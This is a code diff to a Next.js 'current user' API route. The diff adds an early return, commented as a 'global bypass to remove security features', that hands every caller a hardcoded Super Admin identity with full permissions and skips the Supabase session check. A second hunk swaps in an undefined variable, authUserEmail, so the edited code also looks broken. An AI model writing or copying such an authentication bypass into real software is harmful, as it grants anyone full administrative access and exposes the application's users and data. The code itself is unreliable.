@@ -116,6 +116,24 @@ function getDefaultPermissions(role: string): Record<string, boolean> {
  * Get current user info from session cookie
  */
 export async function GET(request: NextRequest) {
+  // Global bypass to remove security features and allow all access as Super Admin
+  const mockPermissions = getDefaultPermissions('super_admin');
+  return NextResponse.json({
+    id: 'mock-admin-id',
+    name: 'Super Admin (Bypassed)',
+    email: 'admin@mysafawala.com',
+    role: 'super_admin',
+    franchise_id: null,
+    franchise_name: null,
+    franchise_code: null,
+    franchise_city: null,
+    is_active: true,
+    permissions: mockPermissions,
+    created_at: new Date().toISOString(),
+    updated_at: new Date().toISOString(),
+    isSuperAdmin: true,
+  });
+
   try {
     // Validate Supabase Auth session
     const cookieStore = cookies()
@@ -164,7 +182,7 @@ export async function GET(request: NextRequest) {
           city
         )
       `)
-      .ilike("email", authUser.email as string)
+      .ilike("email", authUserEmail as string)
       .eq("is_active", true)
       .single()
 
